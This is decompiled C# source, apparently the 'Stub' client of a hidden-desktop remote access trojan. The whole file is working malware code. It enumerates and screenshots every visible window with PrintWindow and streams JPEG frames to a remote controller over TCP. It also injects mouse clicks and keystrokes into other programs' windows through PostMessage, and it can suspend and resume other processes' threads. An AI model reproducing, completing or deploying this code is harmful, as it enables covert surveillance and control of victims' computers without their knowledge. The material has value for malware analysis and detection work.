using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Stub
{
	// Token: 0x02000038 RID: 56
	public static class GClass0
	{
		// Token: 0x060000A5 RID: 165
		[DllImport("kernel32", SetLastError = true)]
		public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string String_6);

		// Token: 0x060000A6 RID: 166
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetProcAddress(IntPtr intptr_5, [MarshalAs(UnmanagedType.VBByRefStr)] ref string String_6);

		// Token: 0x060000A7 RID: 167 RVA: 0x000021CB File Offset: 0x000003CB
		public static T smethod_0<T>(string String_6, string String_7)
		{
			return Conversions.ToGenericParameter<T>(Marshal.GetDelegateForFunctionPointer(GClass0.GetProcAddress(GClass0.LoadLibraryA(ref String_6), ref String_7), typeof(T)));
		}

		// Token: 0x060000A8 RID: 168
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool PostMessage(IntPtr intptr_5, uint uint_0, IntPtr intptr_6, IntPtr intptr_7);

		// Token: 0x060000A9 RID: 169
		[DllImport("user32.dll")]
		public static extern int SendMessage(int int_10, int int_11, int int_12, [MarshalAs(UnmanagedType.LPStr)] string String_6);

		// Token: 0x060000AA RID: 170
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr FindWindow(string String_6, string String_7);

		// Token: 0x060000AB RID: 171
		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr FindWindowEx(IntPtr intptr_5, IntPtr intptr_6, IntPtr intptr_7, string String_6);

		// Token: 0x060000AC RID: 172
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr OpenThread(GClass0.GEnum2 genum2_0, bool bool_2, uint uint_0);

		// Token: 0x060000AD RID: 173
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern uint SuspendThread(IntPtr intptr_5);

		// Token: 0x060000AE RID: 174
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool CloseHandle(IntPtr intptr_5);

		// Token: 0x060000AF RID: 175
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern uint ResumeThread(IntPtr intptr_5);

		// Token: 0x060000B0 RID: 176 RVA: 0x00005658 File Offset: 0x00003858
		public static IntPtr smethod_1(string String_6)
		{
			GClass0.list_0 = new List<string>();
			GClass0.object_0 = new List<IntPtr>();
			checked
			{
				GClass0.GDelegate0 lpEnumCallbackFunction = delegate(IntPtr intptr_0, int int_0)
				{
					bool flag = false;
					bool result;
					try
					{
						StringBuilder stringBuilder = new StringBuilder(255);
						IntPtr intptr_ = intptr_0;
						int int_ = stringBuilder.Capacity + 1;
						IntPtr zero = IntPtr.Zero;
						int num = (int)GClass0.SendMessageTimeout(intptr_, 13, int_, stringBuilder, 2, 1000U, out zero);
						string text = stringBuilder.ToString();
						if (GClass0.gdelegate1_0(intptr_0) && !string.IsNullOrEmpty(text))
						{
							object instance = GClass0.object_0;
							object[] array = new object[]
							{
								intptr_0
							};
							object[] array2 = array;
							bool[] array3 = new bool[]
							{
								true
							};
							NewLateBinding.LateCall(instance, null, "Add", array, null, null, array3, true);
							if (array3[0])
							{
								intptr_0 = (IntPtr)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(IntPtr));
							}
							GClass0.list_0.Add(text);
						}
						flag = true;
						result = true;
					}
					catch (Exception ex)
					{
						result = flag;
					}
					return result;
				};
				GClass0.gdelegate2_0(IntPtr.Zero, lpEnumCallbackFunction, IntPtr.Zero);
				int i = GClass0.list_0.Count - 1;
				while (i >= 0)
				{
					if (!GClass0.list_0[i].ToLower().Contains(String_6.ToLower()))
					{
						i += -1;
					}
					else
					{
						object obj = NewLateBinding.LateIndexGet(GClass0.object_0, new object[]
						{
							i
						}, null);
						if (obj == null)
						{
							return (IntPtr)0;
						}
						return (IntPtr)obj;
					}
				}
				return (IntPtr)0;
			}
		}

		// Token: 0x060000B1 RID: 177 RVA: 0x00005718 File Offset: 0x00003918
		public static void smethod_2(Stream stream_0, object object_1)
		{
			if (object_1 == null)
			{
				return;
			}
			BinaryFormatter binaryFormatter = new BinaryFormatter();
			binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
			binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
			binaryFormatter.FilterLevel = TypeFilterLevel.Full;
			TcpClient obj = GClass0.tcpClient_0;
			checked
			{
				lock (obj)
				{
					object objectValue = RuntimeHelpers.GetObjectValue(object_1);
					MemoryStream memoryStream = new MemoryStream();
					binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
					ulong num = (ulong)memoryStream.Position;
					GClass0.tcpClient_0.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
					byte[] buffer = memoryStream.GetBuffer();
					GClass0.tcpClient_0.GetStream().Write(buffer, 0, (int)num);
					memoryStream.Close();
					memoryStream.Dispose();
				}
			}
		}

		// Token: 0x060000B2 RID: 178 RVA: 0x000057E0 File Offset: 0x000039E0
		public static object smethod_3(FileInfo fileInfo_0)
		{
			object result = null;
			if (fileInfo_0.Exists)
			{
				try
				{
					fileInfo_0.Open(FileMode.Open, FileAccess.ReadWrite, FileShare.None).Close();
					result = false;
					return result;
				}
				catch (Exception ex)
				{
					if (ex is IOException)
					{
						result = true;
						return result;
					}
					return result;
				}
				return result;
			}
			return result;
		}

		// Token: 0x060000B3 RID: 179 RVA: 0x0000584C File Offset: 0x00003A4C
		public static void smethod_4(Process process_1)
		{
			IEnumerator enumerator = null;
			try
			{
				foreach (object obj in process_1.Threads)
				{
					ProcessThread processThread = (ProcessThread)obj;
					IntPtr intPtr = GClass0.OpenThread(GClass0.GEnum2.SUSPEND_RESUME, false, checked((uint)processThread.Id));
					if (intPtr != IntPtr.Zero)
					{
						GClass0.SuspendThread(intPtr);
						GClass0.CloseHandle(intPtr);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x000058D0 File Offset: 0x00003AD0
		public static void smethod_5(Process process_1)
		{
			IEnumerator enumerator = null;
			try
			{
				foreach (object obj in process_1.Threads)
				{
					ProcessThread processThread = (ProcessThread)obj;
					IntPtr intPtr = GClass0.OpenThread(GClass0.GEnum2.SUSPEND_RESUME, false, checked((uint)processThread.Id));
					if (intPtr != IntPtr.Zero)
					{
						GClass0.ResumeThread(intPtr);
						GClass0.CloseHandle(intPtr);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060000B5 RID: 181 RVA: 0x00005954 File Offset: 0x00003B54
		public static void smethod_6(int int_10, int int_11)
		{
			IntPtr intPtr = GClass0.intptr_0 = GClass0.gdelegate5_0(new Point(int_10, int_11));
			GClass0.GStruct0 gstruct = default(GClass0.GStruct0);
			GClass0.gdelegate4_0(intPtr, ref gstruct);
			checked
			{
				Point point = new Point(int_10 - gstruct.int_0, int_11 - gstruct.int_1);
				IntPtr value = GClass0.FindWindow("#32768", null);
				if (value != IntPtr.Zero)
				{
					GClass0.intptr_4 = value;
					IntPtr intptr_ = (IntPtr)GClass0.smethod_16(int_10, int_11);
					GClass0.PostMessage(GClass0.intptr_4, 513U, new IntPtr(1), intptr_);
					GClass0.bool_1 = true;
					return;
				}
				if (GClass0.gdelegate8_0(intPtr) == (IntPtr)0 && int_11 - gstruct.int_1 < GClass0.int_5)
				{
					GClass0.intptr_1 = intPtr;
					GClass0.PostMessage(intPtr, 513U, (IntPtr)1, (IntPtr)GClass0.smethod_16(int_10 - gstruct.int_0, int_11 - gstruct.int_1));
					GClass0.int_6 = int_10;
					GClass0.int_7 = int_11;
					GClass0.intptr_2 = intPtr;
					GClass0.SetWindowPos(intPtr, new IntPtr(-2), 0, 0, 0, 0, 3U);
					GClass0.SetWindowPos(intPtr, new IntPtr(-1), 0, 0, 0, 0, 3U);
					GClass0.SetWindowPos(intPtr, new IntPtr(-2), 0, 0, 0, 0, 67U);
					return;
				}
				if (GClass0.gdelegate8_0(intPtr) == (IntPtr)0 && point.X > gstruct.int_2 - gstruct.int_0 - 10 && point.Y > gstruct.int_3 - gstruct.int_1 - 10)
				{
					GClass0.int_8 = int_10;
					GClass0.int_9 = int_11;
					GClass0.intptr_3 = intPtr;
					return;
				}
				GClass0.PostMessage(intPtr, 513U, (IntPtr)1, (IntPtr)GClass0.smethod_16(int_10 - gstruct.int_0, int_11 - gstruct.int_1));
			}
		}

		// Token: 0x060000B6 RID: 182 RVA: 0x00005B24 File Offset: 0x00003D24
		public static void smethod_7(int int_10, int int_11)
		{
			IntPtr intPtr = GClass0.gdelegate5_0(new Point(int_10, int_11));
			GClass0.GStruct0 gstruct = default(GClass0.GStruct0);
			GClass0.gdelegate4_0(intPtr, ref gstruct);
			if (GClass0.bool_1)
			{
				GClass0.PostMessage(GClass0.intptr_4, 514U, new IntPtr(1), (IntPtr)GClass0.smethod_16(int_10, int_11));
				GClass0.bool_1 = false;
				GClass0.intptr_4 = IntPtr.Zero;
				return;
			}
			checked
			{
				if (GClass0.int_6 > 0 | GClass0.int_7 > 0)
				{
					GClass0.PostMessage(GClass0.intptr_2, 514U, (IntPtr)0L, (IntPtr)GClass0.smethod_16(int_10 - gstruct.int_0, int_11 - gstruct.int_1));
					GClass0.GStruct0 gstruct2 = default(GClass0.GStruct0);
					GClass0.gdelegate4_0(GClass0.intptr_2, ref gstruct2);
					int num = int_10 - GClass0.int_6;
					int num2 = int_11 - GClass0.int_7;
					GClass0.SetWindowPos(GClass0.intptr_2, new IntPtr(0), gstruct2.int_0 + num, gstruct2.int_1 + num2, gstruct2.int_2 - gstruct2.int_0, gstruct2.int_3 - gstruct2.int_1, 64U);
					GClass0.int_6 = 0;
					GClass0.int_7 = 0;
					GClass0.intptr_2 = IntPtr.Zero;
					return;
				}
				if (GClass0.int_8 > 0 | GClass0.int_9 > 0)
				{
					GClass0.GStruct0 gstruct3 = default(GClass0.GStruct0);
					GClass0.gdelegate4_0(GClass0.intptr_3, ref gstruct3);
					int num3 = int_10 - GClass0.int_8;
					int num4 = int_11 - GClass0.int_9;
					int int_12 = gstruct3.int_2 - gstruct3.int_0 + num3;
					int int_13 = gstruct3.int_3 - gstruct3.int_1 + num4;
					GClass0.SetWindowPos(GClass0.intptr_3, new IntPtr(0), gstruct3.int_0, gstruct3.int_1, int_12, int_13, 64U);
					GClass0.int_8 = 0;
					GClass0.int_9 = 0;
					GClass0.intptr_3 = IntPtr.Zero;
					return;
				}
				GClass0.PostMessage(intPtr, 514U, (IntPtr)0L, (IntPtr)GClass0.smethod_16(int_10 - gstruct.int_0, int_11 - gstruct.int_1));
			}
		}

		// Token: 0x060000B7 RID: 183 RVA: 0x00005D30 File Offset: 0x00003F30
		public static void smethod_8(int int_10, int int_11)
		{
			IntPtr hWnd = GClass0.gdelegate5_0(new Point(int_10, int_11));
			GClass0.GStruct0 gstruct = default(GClass0.GStruct0);
			GClass0.gdelegate4_0(hWnd, ref gstruct);
			checked
			{
				new Point(int_10 - gstruct.int_0, int_11 - gstruct.int_1);
				GClass0.PostMessage(GClass0.intptr_0 = GClass0.gdelegate5_0(new Point(int_10, int_11)), 516U, (IntPtr)0L, (IntPtr)GClass0.smethod_16(int_10 - gstruct.int_0, int_11 - gstruct.int_1));
			}
		}

		// Token: 0x060000B8 RID: 184 RVA: 0x00005DC0 File Offset: 0x00003FC0
		public static void smethod_9(int int_10, int int_11)
		{
			IntPtr hWnd = GClass0.gdelegate5_0(new Point(int_10, int_11));
			GClass0.GStruct0 gstruct = default(GClass0.GStruct0);
			GClass0.gdelegate4_0(hWnd, ref gstruct);
			checked
			{
				new Point(int_10 - gstruct.int_0, int_11 - gstruct.int_1);
				GClass0.PostMessage(GClass0.gdelegate5_0(new Point(int_10, int_11)), 517U, (IntPtr)0L, (IntPtr)GClass0.smethod_16(int_10 - gstruct.int_0, int_11 - gstruct.int_1));
			}
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x00005E48 File Offset: 0x00004048
		public static void smethod_10(int int_10, int int_11)
		{
			IntPtr hWnd = GClass0.gdelegate5_0(new Point(int_10, int_11));
			GClass0.GStruct0 gstruct = default(GClass0.GStruct0);
			GClass0.gdelegate4_0(hWnd, ref gstruct);
			checked
			{
				new Point(int_10 - gstruct.int_0, int_11 - gstruct.int_1);
				GClass0.PostMessage(GClass0.intptr_0 = GClass0.gdelegate5_0(new Point(int_10, int_11)), 515U, (IntPtr)0L, (IntPtr)GClass0.smethod_16(int_10 - gstruct.int_0, int_11 - gstruct.int_1));
			}
		}

		// Token: 0x060000BA RID: 186 RVA: 0x00005ED8 File Offset: 0x000040D8
		public static void smethod_11(int int_10, int int_11)
		{
			IntPtr intPtr = GClass0.gdelegate5_0(new Point(int_10, int_11));
			GClass0.GStruct0 gstruct = default(GClass0.GStruct0);
			GClass0.gdelegate4_0(intPtr, ref gstruct);
			GClass0.PostMessage(intPtr, 512U, (IntPtr)0L, (IntPtr)checked(GClass0.smethod_16(int_10 - gstruct.int_0, int_11 - gstruct.int_1)));
		}

		// Token: 0x060000BB RID: 187 RVA: 0x00005F3C File Offset: 0x0000413C
		public static void smethod_12(string String_6)
		{
			int num = Strings.AscW(String_6);
			if (num != 8 && num != 13)
			{
				GClass0.PostMessage(GClass0.intptr_0, 258U, (IntPtr)Strings.AscW(String_6), (IntPtr)1);
				return;
			}
			GClass0.PostMessage(GClass0.intptr_0, 256U, (IntPtr)Conversions.ToInteger("&H" + Conversion.Hex(Strings.AscW(String_6))), GClass0.smethod_14(1, 30, false, false));
			GClass0.PostMessage(GClass0.intptr_0, 257U, (IntPtr)Conversions.ToInteger("&H" + Conversion.Hex(Strings.AscW(String_6))), GClass0.smethod_15(1, 30, false));
		}

		// Token: 0x060000BC RID: 188 RVA: 0x00005FEC File Offset: 0x000041EC
		public static IntPtr smethod_13(ushort ushort_0, byte byte_0, bool bool_2, bool bool_3, bool bool_4)
		{
			int num = (int)ushort_0 | (int)byte_0 << 16;
			if (bool_2)
			{
				num |= 65536;
			}
			if (bool_3)
			{
				num |= 1073741824;
			}
			if (bool_4)
			{
				num |= int.MinValue;
			}
			return new IntPtr(num);
		}

		// Token: 0x060000BD RID: 189 RVA: 0x000021EF File Offset: 0x000003EF
		public static IntPtr smethod_14(ushort ushort_0, byte byte_0, bool bool_2, bool bool_3)
		{
			return GClass0.smethod_13(ushort_0, byte_0, bool_2, bool_3, false);
		}

		// Token: 0x060000BE RID: 190 RVA: 0x000021FB File Offset: 0x000003FB
		public static IntPtr smethod_15(ushort ushort_0, byte byte_0, bool bool_2)
		{
			return GClass0.smethod_13(ushort_0, byte_0, bool_2, true, true);
		}

		// Token: 0x060000BF RID: 191 RVA: 0x00002207 File Offset: 0x00000407
		public static int smethod_16(int int_10, int int_11)
		{
			return int_11 << 16 | (int_10 & 65535);
		}

		// Token: 0x060000C0 RID: 192 RVA: 0x00006028 File Offset: 0x00004228
		public static void smethod_17()
		{
			for (;;)
			{
				try
				{
					Bitmap object_ = GClass0.smethod_18();
					GClass0.smethod_2(GClass0.networkStream_0, object_);
				}
				catch (Exception ex)
				{
				}
				Thread.Sleep(GClass0.int_3);
			}
		}

		// Token: 0x060000C1 RID: 193 RVA: 0x00006070 File Offset: 0x00004270
		public static Bitmap smethod_18()
		{
			Bitmap bitmap = null;
			Bitmap result;
			try
			{
				List<IntPtr> list_0 = new List<IntPtr>();
				GClass0.GDelegate0 lpEnumCallbackFunction = delegate(IntPtr intptr_0, int int_0)
				{
					bool flag = false;
					bool result2;
					try
					{
						if (GClass0.gdelegate1_0(intptr_0))
						{
							list_0.Add(intptr_0);
						}
						flag = true;
						result2 = true;
					}
					catch (Exception ex4)
					{
						result2 = flag;
					}
					return result2;
				};
				if (GClass0.gdelegate2_0(IntPtr.Zero, lpEnumCallbackFunction, IntPtr.Zero))
				{
					Bitmap bitmap2 = new Bitmap(GClass0.int_1, GClass0.int_2);
					Bitmap bitmap3;
					ImageCodecInfo encoder;
					EncoderParameters encoderParameters;
					checked
					{
						for (int i = list_0.Count - 1; i >= 0; i += -1)
						{
							try
							{
								GClass0.GStruct0 gstruct = default(GClass0.GStruct0);
								GClass0.gdelegate4_0(list_0[i], ref gstruct);
								Bitmap image = new Bitmap(gstruct.int_2 - gstruct.int_0 + 1, gstruct.int_3 - gstruct.int_1 + 1);
								Graphics graphics = Graphics.FromImage(image);
								IntPtr hdc = graphics.GetHdc();
								try
								{
									if (GClass0.bool_0)
									{
										GClass0.gdelegate3_0(list_0[i], hdc, 2U);
									}
									else
									{
										GClass0.gdelegate3_0(list_0[i], hdc, 0U);
									}
								}
								catch (Exception ex)
								{
								}
								graphics.ReleaseHdc(hdc);
								graphics.FillRectangle(Brushes.Gray, gstruct.int_2 - gstruct.int_0 - 10, gstruct.int_3 - gstruct.int_1 - 10, 10, 10);
								Graphics.FromImage(bitmap2).DrawImage(image, gstruct.int_0, gstruct.int_1);
							}
							catch (Exception ex2)
							{
							}
						}
						bitmap3 = new Bitmap(bitmap2, (int)Math.Round(unchecked((double)GClass0.int_1 * GClass0.double_0)), (int)Math.Round(unchecked((double)GClass0.int_2 * GClass0.double_0)));
						encoder = GClass0.smethod_19("image/jpeg");
						encoderParameters = new EncoderParameters(1);
					}
					encoderParameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)GClass0.int_4);
					MemoryStream stream = new MemoryStream();
					bitmap3.Save(stream, encoder, encoderParameters);
					Bitmap bitmap4 = (Bitmap)Image.FromStream(stream);
					bitmap3.Dispose();
					GC.Collect();
					bitmap = bitmap4;
					result = bitmap;
				}
				else
				{
					result = bitmap;
				}
			}
			catch (Exception ex3)
			{
				GClass0.smethod_2(GClass0.networkStream_0, "60|" + ex3.ToString());
				try
				{
					bitmap = GClass0.smethod_20();
					ProjectData.ClearProjectError();
					return bitmap;
				}
				catch (Exception ex4)
				{
				}
				result = bitmap;
			}
			return result;
		}

		// Token: 0x060000C2 RID: 194 RVA: 0x0000633C File Offset: 0x0000453C
		public static ImageCodecInfo smethod_19(string String_6)
		{
			if (String_6 == null)
			{
				return null;
			}
			foreach (ImageCodecInfo imageCodecInfo in GClass0.imageCodecInfo_0)
			{
				if (Operators.CompareString(imageCodecInfo.MimeType, String_6, false) == 0)
				{
					return imageCodecInfo;
				}
			}
			return null;
		}

		// Token: 0x060000C3 RID: 195 RVA: 0x00006378 File Offset: 0x00004578
		public static Bitmap smethod_20()
		{
			Bitmap bitmap = new Bitmap(GClass0.int_1, GClass0.int_2);
			Bitmap result;
			using (Graphics graphics = Graphics.FromImage(bitmap))
			{
				SolidBrush brush = (SolidBrush)Brushes.Red;
				graphics.FillRectangle(brush, 0, 0, GClass0.int_1, GClass0.int_2);
				result = bitmap;
			}
			return result;
		}

		// Token: 0x060000C4 RID: 196
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern uint SendMessageTimeout(IntPtr intptr_5, int int_10, int int_11, StringBuilder stringBuilder_0, int int_12, uint uint_0, out IntPtr intptr_6);

		// Token: 0x060000C5 RID: 197 RVA: 0x000063DC File Offset: 0x000045DC
		public static object smethod_21()
		{
			object obj = null;
			object result;
			try
			{
				OperatingSystem osversion = Environment.OSVersion;
				Version version = osversion.Version;
				if (osversion.Platform == PlatformID.Win32NT && version.Major == 6 && version.Minor != 0 && version.Minor != 1)
				{
					obj = true;
					result = obj;
				}
				else
				{
					obj = false;
					result = obj;
				}
			}
			catch (Exception ex)
			{
				result = obj;
			}
			return result;
		}

		// Token: 0x060000C6 RID: 198
		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool ShowWindow(IntPtr intptr_5, [MarshalAs(UnmanagedType.I4)] int int_10);

		// Token: 0x060000C7 RID: 199
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SetWindowPos(IntPtr intptr_5, IntPtr intptr_6, int int_10, int int_11, int int_12, int int_13, uint uint_0);

		// Token: 0x0400005E RID: 94
		public static TcpClient tcpClient_0 = new TcpClient();

		// Token: 0x0400005F RID: 95
		public static NetworkStream networkStream_0;

		// Token: 0x04000060 RID: 96
		public static string String_0;

		// Token: 0x04000061 RID: 97
		public static int int_0;

		// Token: 0x04000062 RID: 98
		public static string String_1;

		// Token: 0x04000063 RID: 99
		public static string String_2;

		// Token: 0x04000064 RID: 100
		public static int int_1 = 1028;

		// Token: 0x04000065 RID: 101
		public static int int_2 = 1028;

		// Token: 0x04000066 RID: 102
		public static IntPtr intptr_0;

		// Token: 0x04000067 RID: 103
		public static IntPtr intptr_1;

		// Token: 0x04000068 RID: 104
		public static int int_3 = 500;

		// Token: 0x04000069 RID: 105
		public static int int_4 = 50;

		// Token: 0x0400006A RID: 106
		public static double double_0 = 0.5;

		// Token: 0x0400006B RID: 107
		public static int int_5;

		// Token: 0x0400006C RID: 108
		public static bool bool_0 = false;

		// Token: 0x0400006D RID: 109
		public static readonly GClass0.GDelegate1 gdelegate1_0 = GClass0.smethod_0<GClass0.GDelegate1>("user32", "IsWindowVisible");

		// Token: 0x0400006E RID: 110
		public static readonly GClass0.GDelegate2 gdelegate2_0 = GClass0.smethod_0<GClass0.GDelegate2>("user32", "EnumDesktopWindows");

		// Token: 0x0400006F RID: 111
		public static readonly GClass0.GDelegate3 gdelegate3_0 = GClass0.smethod_0<GClass0.GDelegate3>("user32", "PrintWindow");

		// Token: 0x04000070 RID: 112
		public static readonly GClass0.GDelegate4 gdelegate4_0 = GClass0.smethod_0<GClass0.GDelegate4>("user32", "GetWindowRect");

		// Token: 0x04000071 RID: 113
		public static readonly GClass0.GDelegate5 gdelegate5_0 = GClass0.smethod_0<GClass0.GDelegate5>("user32", "WindowFromPoint");

		// Token: 0x04000072 RID: 114
		public static readonly GClass0.GDelegate6 gdelegate6_0 = GClass0.smethod_0<GClass0.GDelegate6>("user32", "GetWindow");

		// Token: 0x04000073 RID: 115
		public static readonly GClass0.GDelegate7 gdelegate7_0 = GClass0.smethod_0<GClass0.GDelegate7>("user32", "IsZoomed");

		// Token: 0x04000074 RID: 116
		public static readonly GClass0.GDelegate8 gdelegate8_0 = GClass0.smethod_0<GClass0.GDelegate8>("user32", "GetParent");

		// Token: 0x04000075 RID: 117
		public static readonly GClass0.GDelegate9 gdelegate9_0 = GClass0.smethod_0<GClass0.GDelegate9>("user32", "GetSystemMetrics");

		// Token: 0x04000076 RID: 118
		public static int int_6;

		// Token: 0x04000077 RID: 119
		public static int int_7 = 0;

		// Token: 0x04000078 RID: 120
		public static int int_8;

		// Token: 0x04000079 RID: 121
		public static int int_9 = 0;

		// Token: 0x0400007A RID: 122
		public static IntPtr intptr_2;

		// Token: 0x0400007B RID: 123
		public static IntPtr intptr_3;

		// Token: 0x0400007C RID: 124
		public static IntPtr intptr_4;

		// Token: 0x0400007D RID: 125
		public static bool bool_1 = false;

		// Token: 0x0400007E RID: 126
		public static ImageCodecInfo[] imageCodecInfo_0 = ImageCodecInfo.GetImageEncoders();

		// Token: 0x0400007F RID: 127
		public static string String_3;

		// Token: 0x04000080 RID: 128
		public static string String_4;

		// Token: 0x04000081 RID: 129
		public static Process process_0 = new Process();

		// Token: 0x04000082 RID: 130
		public static string String_5;

		// Token: 0x04000083 RID: 131
		public static Computer computer_0 = new Computer();

		// Token: 0x04000084 RID: 132
		public static List<string> list_0 = new List<string>();

		// Token: 0x04000085 RID: 133
		public static object object_0 = new List<IntPtr>();

		// Token: 0x04000086 RID: 134
		public static Thread thread_0 = new Thread(new ThreadStart(GClass0.smethod_17));

		// Token: 0x02000039 RID: 57
		// (Invoke) Token: 0x060000CA RID: 202
		public delegate bool GDelegate0(IntPtr hWnd, int lParam);

		// Token: 0x0200003A RID: 58
		public struct GStruct0
		{
			// Token: 0x04000087 RID: 135
			public int int_0;

			// Token: 0x04000088 RID: 136
			public int int_1;

			// Token: 0x04000089 RID: 137
			public int int_2;

			// Token: 0x0400008A RID: 138
			public int int_3;
		}

		// Token: 0x0200003B RID: 59
		private enum GEnum0
		{
			// Token: 0x0400008C RID: 140
			CWP_ALL
		}

		// Token: 0x0200003C RID: 60
		[Flags]
		private enum GEnum1 : uint
		{
			// Token: 0x0400008E RID: 142
			Invalidate = 1U,
			// Token: 0x0400008F RID: 143
			InternalPaint = 2U,
			// Token: 0x04000090 RID: 144
			Erase = 4U,
			// Token: 0x04000091 RID: 145
			Validate = 8U,
			// Token: 0x04000092 RID: 146
			NoInternalPaint = 16U,
			// Token: 0x04000093 RID: 147
			NoErase = 32U,
			// Token: 0x04000094 RID: 148
			NoChildren = 64U,
			// Token: 0x04000095 RID: 149
			AllChildren = 128U,
			// Token: 0x04000096 RID: 150
			UpdateNow = 256U,
			// Token: 0x04000097 RID: 151
			EraseNow = 512U,
			// Token: 0x04000098 RID: 152
			Frame = 1024U,
			// Token: 0x04000099 RID: 153
			NoFrame = 2048U
		}

		// Token: 0x0200003D RID: 61
		[Flags]
		public enum GEnum2
		{
			// Token: 0x0400009B RID: 155
			TERMINATE = 1,
			// Token: 0x0400009C RID: 156
			SUSPEND_RESUME = 2,
			// Token: 0x0400009D RID: 157
			GET_CONTEXT = 8,
			// Token: 0x0400009E RID: 158
			SET_CONTEXT = 16,
			// Token: 0x0400009F RID: 159
			SET_INFORMATION = 32,
			// Token: 0x040000A0 RID: 160
			QUERY_INFORMATION = 64,
			// Token: 0x040000A1 RID: 161
			SET_THREAD_TOKEN = 128,
			// Token: 0x040000A2 RID: 162
			IMPERSONATE = 256,
			// Token: 0x040000A3 RID: 163
			DIRECT_IMPERSONATION = 512
		}

		// Token: 0x0200003E RID: 62
		// (Invoke) Token: 0x060000CE RID: 206
		[return: MarshalAs(UnmanagedType.Bool)]
		public delegate bool GDelegate1(IntPtr hWnd);

		// Token: 0x0200003F RID: 63
		// (Invoke) Token: 0x060000D2 RID: 210
		public delegate bool GDelegate2(IntPtr hDesktop, GClass0.GDelegate0 lpEnumCallbackFunction, IntPtr lParam);

		// Token: 0x02000040 RID: 64
		// (Invoke) Token: 0x060000D6 RID: 214
		public delegate bool GDelegate3(IntPtr hwnd, IntPtr hdcBlt, uint nFlags);

		// Token: 0x02000041 RID: 65
		// (Invoke) Token: 0x060000DA RID: 218
		public delegate bool GDelegate4(IntPtr hWnd, ref GClass0.GStruct0 lpRect);

		// Token: 0x02000042 RID: 66
		// (Invoke) Token: 0x060000DE RID: 222
		public delegate IntPtr GDelegate5(Point p);

		// Token: 0x02000043 RID: 67
		// (Invoke) Token: 0x060000E2 RID: 226
		public delegate IntPtr GDelegate6(IntPtr hWnd, uint uCmd);

		// Token: 0x02000044 RID: 68
		// (Invoke) Token: 0x060000E6 RID: 230
		[return: MarshalAs(UnmanagedType.Bool)]
		public delegate bool GDelegate7(IntPtr hwnd);

		// Token: 0x02000045 RID: 69
		// (Invoke) Token: 0x060000EA RID: 234
		public delegate IntPtr GDelegate8(IntPtr hwnd);

		// Token: 0x02000046 RID: 70
		// (Invoke) Token: 0x060000EE RID: 238
		public delegate int GDelegate9(int nIndex);

		// Token: 0x02000047 RID: 71
		[CompilerGenerated]
		[Serializable]
		private sealed class Class5
		{
			// Token: 0x060000F1 RID: 241 RVA: 0x000065B0 File Offset: 0x000047B0
			public bool method_0(IntPtr intptr_0, int int_0)
			{
				bool flag = false;
				checked
				{
					bool result;
					try
					{
						StringBuilder stringBuilder = new StringBuilder(255);
						IntPtr intptr_ = intptr_0;
						int int_ = stringBuilder.Capacity + 1;
						IntPtr zero = IntPtr.Zero;
						int num = (int)GClass0.SendMessageTimeout(intptr_, 13, int_, stringBuilder, 2, 1000U, out zero);
						string text = stringBuilder.ToString();
						if (GClass0.gdelegate1_0(intptr_0) && !string.IsNullOrEmpty(text))
						{
							object object_ = GClass0.object_0;
							object[] array = new object[]
							{
								intptr_0
							};
							object[] array2 = array;
							bool[] array3 = new bool[]
							{
								true
							};
							NewLateBinding.LateCall(object_, null, "Add", array, null, null, array3, true);
							if (array3[0])
							{
								intptr_0 = (IntPtr)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(IntPtr));
							}
							GClass0.list_0.Add(text);
						}
						flag = true;
						result = true;
					}
					catch (Exception ex)
					{
						result = flag;
					}
					return result;
				}
			}

			// Token: 0x040000A4 RID: 164
			public static readonly GClass0.Class5 _003C_003E9 = new GClass0.Class5();

			// Token: 0x040000A5 RID: 165
			public static GClass0.GDelegate0 _003C_003E9__66_0;
		}

		// Token: 0x02000048 RID: 72
		[CompilerGenerated]
		private sealed class Class6
		{
			// Token: 0x060000F4 RID: 244 RVA: 0x000066A4 File Offset: 0x000048A4
			public bool method_0(IntPtr intptr_0, int int_0)
			{
				bool flag = false;
				bool result;
				try
				{
					if (GClass0.gdelegate1_0(intptr_0))
					{
						this.list_0.Add(intptr_0);
					}
					flag = true;
					result = true;
				}
				catch (Exception ex)
				{
					result = flag;
				}
				return result;
			}

			// Token: 0x040000A6 RID: 166
			public List<IntPtr> list_0;
		}
	}
}
